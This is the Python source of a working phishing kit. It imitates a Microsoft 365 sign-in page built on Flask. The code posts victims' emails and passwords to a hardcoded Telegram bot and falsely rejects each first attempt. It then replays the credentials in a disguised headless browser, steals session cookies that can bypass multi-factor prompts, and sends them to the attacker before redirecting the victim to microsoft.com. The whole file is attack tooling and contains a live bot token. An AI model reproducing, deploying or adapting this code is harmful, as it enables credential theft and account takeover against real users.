from flask import Flask, request, render_template, jsonify, redirect, url_for, flash
import re
import dns.resolver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from time import sleep
import requests
import logging
import os
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
# from python_decouple import config
# Use os.environ instead for simplicity
def config(key, default=None):
    return os.environ.get(key, default)
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired
try:
    from wtforms.validators import Email
except ImportError:
    # Fallback if email_validator is not installed
    class Email:
        def __init__(self, message=None):
            self.message = message or "Invalid email address"

        def __call__(self, form, field):
            import re
            if not re.match(r"[^@]+@[^@]+\.[^@]+", field.data):
                raise ValueError(self.message)
import bcrypt
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sentry_sdk
import json
import uuid
from functools import wraps

# Initialize Sentry for monitoring (optional)
sentry_dsn = config('SENTRY_DSN', default=None)
if sentry_dsn:
    sentry_sdk.init(dsn=sentry_dsn)

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", 'dev-key-change-in-production')

# Enhanced logging configuration
if not os.path.exists('logs'):
    os.makedirs('logs')

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Database configuration  
database_url = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
# Handle sqlite URL format for SQLAlchemy 1.4+
if database_url.startswith('sqlite:///'):
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
    app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {}
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
    app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
        "pool_recycle": 300,
        "pool_pre_ping": True,
    }
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize extensions
db = SQLAlchemy(app)
# csrf = CSRFProtect(app)  # Disabled since we removed sessions
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["1000 per hour", "100 per minute"]
)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)

class ActivityLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_email = db.Column(db.String(120))
    action = db.Column(db.String(100), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    success = db.Column(db.Boolean, default=True)
    error_message = db.Column(db.Text)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_email = db.Column(db.String(120), nullable=False)
    request_id = db.Column(db.String(255), nullable=False)
    attempt_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Next')

def log_activity(action, user_email=None, success=True, error_message=None):
    """Log activity for debugging purposes"""
    try:
        log_entry = ActivityLog()
        log_entry.user_email = user_email
        log_entry.action = action
        log_entry.ip_address = get_remote_address()
        log_entry.user_agent = request.user_agent.string
        log_entry.success = success
        log_entry.error_message = error_message
        db.session.add(log_entry)
        db.session.commit()
        logger.info(f"Activity logged: {action} for {user_email}")
    except Exception as e:
        logger.error(f"Failed to log activity: {e}")

def create_request_id():
    """Create a unique request ID for tracking login attempts"""
    return str(uuid.uuid4())

def validate_email_domain(email):
    """Enhanced email domain validation"""
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        return False, "Invalid email format"

    domain = email.split('@')[1]
    try:
        # Check for MX records
        mx_records = dns.resolver.resolve(domain, 'MX')
        if not mx_records:
            return False, "Domain has no mail servers"

        logger.info(f"Domain {domain} validated successfully")
        return True, "Valid domain"
    except Exception as e:
        logger.error(f"MX lookup failed for {domain}: {e}")
        return False, f"Invalid domain: {str(e)}"

def setup_chrome_driver():
    """Setup Chrome WebDriver with proper options"""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-plugins")
        options.add_argument("--disable-images")
        options.add_argument("--disable-javascript")
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

        # Try to create driver
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)

        logger.info("Chrome WebDriver initialized successfully")
        return driver
    except Exception as e:
        logger.error(f"Failed to initialize Chrome WebDriver: {e}")
        # Try installing Chrome if it fails
        import subprocess
        try:
            subprocess.run(['apt-get', 'update'], check=True, capture_output=True)
            subprocess.run(['apt-get', 'install', '-y', 'google-chrome-stable'], check=True, capture_output=True)
            logger.info("Chrome installed successfully")
            # Retry driver creation
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(30)
            driver.implicitly_wait(10)
            return driver
        except Exception as install_error:
            logger.error(f"Failed to install Chrome: {install_error}")
            raise e

def extract_and_save_cookies(driver, email, password=None):
    """Extract only session cookies from successful Office.com login and save them"""
    try:
        # Navigate to office.com to verify successful login and get session cookies
        driver.get("https://office.com")
        sleep(5)  # Wait for page to load

        # Check if we're actually logged in to Office.com
        current_url = driver.current_url
        page_title = driver.title.lower()

        # Verify we're successfully logged into Office
        if "office" not in current_url.lower() or "sign" in page_title or "login" in page_title:
            logger.warning(f"Not successfully logged into Office.com. URL: {current_url}, Title: {page_title}")
            return False

        cookies = driver.get_cookies()
        if not cookies:
            logger.warning("No cookies found in WebDriver")
            return False

        # Filter only session-related cookies from office.com and microsoft domains
        session_cookies = []
        session_cookie_names = [
            'FedAuth', 'rtFa', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
            'SignInStateCookie', 'buid', 'MSFPC', 'ai_session', 'MUID',
            'wla42', 'MSPAuth', 'MSPProf', 'MSPSoftVis', 'MSCC'
        ]

        for cookie in cookies:
            # Include cookies from Microsoft/Office domains that are session-related
            if (any(domain in cookie['domain'].lower() for domain in ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com']) and
                (cookie['name'] in session_cookie_names or 'auth' in cookie['name'].lower() or 'session' in cookie['name'].lower())):
                session_cookies.append(cookie)

        if not session_cookies:
            logger.warning("No session cookies found for Office.com")
            return False

        # Create cookies directory if it doesn't exist
        if not os.path.exists('cookies'):
            os.makedirs('cookies')

        # Save only session cookies with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'

        with open(filename, 'w') as f:
            f.write(f"# WORKER CREDENTIALS CAPTURED\n")
            f.write(f"# Email: {email}\n")
            f.write(f"# IP Address: {request.remote_addr if request else 'Unknown'}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write(f"# Successfully logged into Office.com: {current_url}\n")
            f.write(f"# Total session cookies: {len(session_cookies)}\n\n")
            f.write("=" * 60 + "\n")
            f.write("SESSION COOKIES:\n")
            f.write("=" * 60 + "\n\n")

            for cookie in session_cookies:
                f.write(f"Name: {cookie['name']}\n")
                f.write(f"Value: {cookie['value']}\n")
                f.write(f"Domain: {cookie['domain']}\n")
                f.write(f"Path: {cookie['path']}\n")
                f.write(f"Secure: {cookie['secure']}\n")
                f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                f.write("-" * 50 + "\n")

        # Also save as JSON for easier parsing
        json_filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.json'
        with open(json_filename, 'w') as f:
            json.dump(session_cookies, f, indent=2)

        logger.info(f"Session cookies saved to {filename} and {json_filename}")
        return filename
    except Exception as e:
        logger.error(f"Failed to extract and save session cookies: {e}")
        return False

def send_to_telegram(email, password, ip_address, attempt_type="immediate", cookie_file=None):
    """Unified function to send credentials to Telegram"""
    try:
        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
        chat_id = "1645281955"

        if not bot_token or not chat_id or bot_token.strip() == '' or chat_id.strip() == '':
            logger.error("❌ Telegram credentials not properly configured!")
            return False

        # Create message based on attempt type
        if attempt_type == "immediate":
            message = f"""🚨 WORKER CREDENTIALS CAPTURED
📧 Email: {email}
🔒 Password: {password}
🌐 IP: {ip_address}
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
⚡ Status: IMMEDIATE CAPTURE"""

        elif attempt_type == "first":
            message = f"""🔑 WORKER - FIRST ATTEMPT
📧 Email: {email}
🔒 Password: {password}
🌐 IP: {ip_address}
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
⚠️ First attempt - moving to retry"""

        elif attempt_type == "second":
            message = f"""🔑 WORKER - SECOND ATTEMPT
📧 Email: {email}
🔒 Password: {password}
🌐 IP: {ip_address}
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
✅ Second attempt - starting automation"""

        elif attempt_type == "final":
            message = f"""🔑 FINAL WORKER REPORT
📧 Email: {email}
🔒 Password: {password}
🌐 IP: {ip_address}
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
📁 Cookie File: {cookie_file.split('/')[-1] if cookie_file else 'No file'}
✅ Automation completed"""

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=30)

        logger.info(f"Telegram {attempt_type} response: {response.status_code}")

        # Send cookie file if provided
        if cookie_file and os.path.exists(cookie_file) and attempt_type == "final":
            try:
                file_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                with open(cookie_file, 'rb') as file:
                    file_response = requests.post(
                        file_url,
                        data={'chat_id': chat_id, 'caption': f"📁 Cookies for {email}"},
                        files={'document': file},
                        timeout=30
                    )
                logger.info(f"Cookie file sent: {file_response.status_code}")
            except Exception as file_e:
                logger.error(f"❌ File send error: {file_e}")

        return response.status_code == 200

    except Exception as e:
        logger.error(f"❌ Telegram error: {e}")
        return False

@app.route('/')
@limiter.limit("200 per minute")
def index():
    email = request.args.get('email', '').strip()
    step = request.args.get('step', 'email')
    error = request.args.get('error', '')

    log_activity("page_visit", user_email=email)

    # Email validation step
    if step == 'email' and email:
        valid, message = validate_email_domain(email)
        if not valid:
            flash(message, 'error')
            log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
            return render_template('index.html', step='email', error=message)

    form = LoginForm()
    sitekey = config('CLOUDFLARE_SITEKEY', default='')

    return render_template('index.html', 
                         form=form, 
                         email=email, 
                         step=step, 
                         error=error, 
                         sitekey=sitekey)

@app.route('/verify-turnstile', methods=['POST'])
@limiter.limit("50 per minute")
def verify_turnstile():
    """Verify Cloudflare Turnstile challenge"""
    try:
        token = request.form.get('cf-turnstile-response')
        if not token:
            return jsonify({'success': False, 'error': 'No token provided'})

        secret_key = config('CLOUDFLARE_SECRET_KEY', default='')
        if not secret_key:
            logger.warning("Cloudflare secret key not configured")
            return jsonify({'success': True})  # Allow in development

        response = requests.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            data={
                'secret': secret_key,
                'response': token,
                'remoteip': get_remote_address()
            },
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )

        result = response.json()
        success = result.get('success', False)

        log_activity("turnstile_verification", success=success, 
                    error_message=None if success else str(result.get('error-codes', [])))

        return jsonify({
            'success': success,
            'error-codes': result.get('error-codes', [])
        })

    except Exception as e:
        logger.error(f"Turnstile verification error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/', methods=['POST'])
@limiter.limit("100 per minute")
def process_form():
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '')
    worker_ip = get_remote_address()

    logger.info(f"🔍 Processing form: {email}")

    # Consolidated Telegram message submission
    if email and password:
        telegram_sent = send_to_telegram(email, password, worker_ip, "immediate")
        logger.info(f"Telegram sent: {telegram_sent} for {email}")

    # Handle direct form submission from JavaScript
    if not email or not password:
        flash('Email and password are required', 'error')
        return redirect(url_for('index', step='password', email=email, error='true'))

    # CSRF protection disabled since we removed sessions
    logger.info("Processing form submission without CSRF validation")

    submit_action = request.form.get('submit', 'Sign in')

    # Validate email domain first
    valid, message = validate_email_domain(email)
    if not valid:
        flash(message, 'error')
        log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
        return redirect(url_for('index', step='password', email=email, error='true'))

    # Two-pass authentication logic using request ID instead of session
    request_id = request.form.get('request_id', create_request_id())
    login_attempt = LoginAttempt.query.filter_by(
        user_email=email, 
        request_id=request_id
    ).first()

    if not login_attempt:
        # First attempt - create new attempt record and go to second pass
        login_attempt = LoginAttempt()
        login_attempt.user_email = email
        login_attempt.request_id = request_id
        login_attempt.attempt_count = 1
        db.session.add(login_attempt)
        db.session.commit()

        log_activity("first_attempt_blocked", user_email=email, success=False, 
                    error_message="First attempt automatically failed - moving to second pass")

        # Always flash error for first attempt and redirect to retry
        flash('Your account or password is incorrect. Try again.', 'error')
        return redirect(url_for('index', step='retry', email=email, retry='true'))

    elif login_attempt.attempt_count == 1:
        # Second attempt - proceed with automation
        login_attempt.attempt_count = 2
        login_attempt.updated_at = datetime.utcnow()
        db.session.commit()
        log_activity("second_attempt_proceeding", user_email=email)

        # Continue with Selenium automation below

    else:
        # More than 2 attempts - reset and start over
        login_attempt.attempt_count = 1
        login_attempt.updated_at = datetime.utcnow()
        db.session.commit()

        flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
        log_activity("attempt_reset", user_email=email, success=False, 
                    error_message="Attempt counter reset - starting two-pass cycle again")
        return redirect(url_for('index', step='password', email=email, error='true'))

    # Perform Selenium automation (moved outside else block)
    driver = None
    try:
        log_activity("selenium_automation_started", user_email=email)
        driver = setup_chrome_driver()

        # Navigate to Microsoft login
        driver.get("https://login.microsoftonline.com")
        logger.info("Navigated to Microsoft login page")

        # Wait for and fill email
        email_field = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.NAME, "loginfmt"))
        )
        email_field.clear()
        email_field.send_keys(email)

        # Click next
        next_button = driver.find_element(By.ID, "idSIButton9")
        next_button.click()

        # Wait for password field
        sleep(3)
        password_field = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.NAME, "passwd"))
        )
        password_field.clear()
        password_field.send_keys(password)

        # Click sign in
        signin_button = driver.find_element(By.ID, "idSIButton9")
        signin_button.click()

        # Wait for login to complete
        sleep(10)

        # Check for errors
        current_url = driver.current_url
        page_source = driver.page_source.lower()

        if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
            if 'error' in current_url:
                error_msg = "Login failed - invalid credentials or account issue"
                logger.error(f"Login failed for {email}: error in URL")
                log_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
                flash(error_msg, 'error')
                return redirect(url_for('index', step='password', email=email, error='true'))

        # Always send worker details to Telegram first, even before cookie extraction
        worker_ip = get_remote_address()
        logger.info(f"Attempting to send worker details to Telegram for {email}")

        # Extract and save cookies
        cookie_file = extract_and_save_cookies(driver, email, password)
        if not cookie_file:
            error_msg = "Failed to extract cookies"
            log_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            return redirect(url_for('index', step='password', email=email, error='true'))

        # Send final report with cookies to Telegram
        telegram_success = send_to_telegram(email, password, worker_ip, "final", cookie_file)
        if telegram_success:
            log_activity("telegram_send_success", user_email=email)
            logger.info(f"✅ Final report sent to Telegram for {email}")
        else:
            log_activity("telegram_send_failed", user_email=email, success=False)
            logger.error(f"❌ Failed to send final report to Telegram for {email}")

        # Update or create user record
        user = User.query.filter_by(email=email).first()
        if not user:
            user = User(email=email)
            db.session.add(user)
        user.last_login = datetime.utcnow()
        db.session.commit()

        log_activity("login_automation_completed", user_email=email)
        logger.info(f"Successful login automation for {email}")

        # Redirect to Microsoft.com after successful cookie extraction
        return redirect("https://microsoft.com")

    except TimeoutException as e:
        error_msg = f"Login timeout - please try again: {str(e)}"
        logger.error(f"Timeout during login automation for {email}: {e}")
        log_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
        flash(error_msg, 'error')

    except WebDriverException as e:
        error_msg = f"Browser automation error: {str(e)}"
        logger.error(f"WebDriver error for {email}: {e}")
        log_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
        flash(error_msg, 'error')

    except Exception as e:
        error_msg = f"Unexpected error during login automation: {str(e)}"
        logger.error(f"Unexpected error during login for {email}: {e}")
        log_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
        flash(error_msg, 'error')

    finally:
        # Ensure driver is always cleaned up
        if driver:
            try:
                driver.close()
                driver.quit()
                logger.info("WebDriver cleaned up successfully")
            except Exception as e:
                logger.error(f"Error during WebDriver cleanup: {e}")
                # Force kill any remaining browser processes
                try:
                    import subprocess
                    subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
                except:
                    pass

    return redirect(url_for('index', step='password', email=email, error='true'))

@app.route('/debug/activity')
@limiter.limit("5 per minute")
def debug_activity():
    """Debug endpoint to view activity information"""
    try:
        # Get recent activity logs
        recent_logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).limit(50).all()

        # Get recent login attempts
        recent_attempts = LoginAttempt.query.order_by(LoginAttempt.updated_at.desc()).limit(20).all()

        activity_data = {
            'total_logs': ActivityLog.query.count(),
            'total_attempts': LoginAttempt.query.count(),
            'recent_logs': recent_logs,
            'recent_attempts': recent_attempts
        }

        return render_template('debug.html', 
                             activity_data=activity_data)

    except Exception as e:
        logger.error(f"Error in debug activity: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/test-telegram-simple')
@limiter.limit("2 per minute") 
def test_telegram_simple():
    """Simple test to send a message to Telegram using hardcoded credentials"""
    try:
        # Use the same hardcoded values as in the main function
        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
        chat_id = "1645281955"

        logger.info(f"🧪 Simple Telegram Test")
        logger.info(f"BOT_TOKEN: {bot_token[:20]}...")
        logger.info(f"CHAT_ID: {chat_id}")

        if not bot_token or not chat_id:
            return f"Missing credentials: BOT_TOKEN={bool(bot_token)}, CHAT_ID={bool(chat_id)}"

        message = f"🧪 DIRECT TEST from Flask app at {datetime.now()}"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

        logger.info(f"📤 Sending to URL: {url}")

        response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=10)

        logger.info(f"📨 Response Status: {response.status_code}")
        logger.info(f"📨 Response Text: {response.text}")

        return f"Status: {response.status_code}, Response: {response.text}"

    except Exception as e:
        logger.error(f"❌ Test error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/test-telegram')
@limiter.limit("2 per minute")
def test_telegram():
    """Test Telegram bot connection"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)

        logger.info(f"🧪 Testing Telegram connection...")
        logger.info(f"BOT_TOKEN: {bot_token[:10] + '...' if bot_token and len(bot_token) > 10 else bot_token}")
        logger.info(f"CHAT_ID: {chat_id}")

        if not bot_token or bot_token == 'your-telegram-bot-token-here':
            error_msg = 'BOT_TOKEN not properly configured in .env file'
            logger.error(f"❌ {error_msg}")
            return jsonify({'error': error_msg}), 400

        if not chat_id or chat_id == 'your-telegram-chat-id-here':
            error_msg = 'CHAT_ID not properly configured in .env file'
            logger.error(f"❌ {error_msg}")
            return jsonify({'error': error_msg}), 400

        # Test message
        test_message = f"""🧪 TELEGRAM TEST MESSAGE
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
✅ Connection working!
🤖 Bot Token: {bot_token[:10]}...
💬 Chat ID: {chat_id}"""

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

        logger.info(f"📤 Sending test message to: {url}")

        response = requests.post(
            url,
            data={
                'chat_id': chat_id,
                'text': test_message
            },
            timeout=15
        )

        logger.info(f"📨 Response Status: {response.status_code}")
        logger.info(f"📨 Response Text: {response.text}")

        if response.status_code == 200:
            logger.info("✅ Test message sent successfully!")
            return jsonify({
                'success': True,
                'message': 'Test message sent to Telegram successfully!',
                'bot_token_preview': f"{bot_token[:10]}...",
                'chat_id': chat_id,
                'response': response.json()
            })
        else:
            error_msg = f"Failed to send test message: {response.text}"
            logger.error(f"❌ {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg,
                'status_code': response.status_code,
                'bot_token_preview': f"{bot_token[:10]}...",
                'chat_id': chat_id
            }), 400

    except Exception as e:
        error_msg = f"Exception during Telegram test: {str(e)}"
        logger.error(f"❌ {error_msg}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        from sqlalchemy import text
        db.session.execute(text('SELECT 1'))
        db_status = 'OK'
    except Exception as e:
        db_status = f'Error: {str(e)}'

    return jsonify({
        'status': 'healthy',
        'database': db_status,
        'timestamp': datetime.utcnow().isoformat()
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    flash('Rate limit exceeded. Please try again later.', 'error')
    return render_template('index.html', error='Rate limit exceeded'), 429

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {error}")
    db.session.rollback()
    flash('An internal error occurred. Please try again.', 'error')
    return render_template('index.html', error='Internal server error'), 500

# Ensure required directories exist
required_dirs = ['logs', 'cookies']
for directory in required_dirs:
    if not os.path.exists(directory):
        os.makedirs(directory)
        logger.info(f"Created directory: {directory}")

# Initialize database
with app.app_context():
    db.create_all()
    logger.info("Database tables created successfully")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)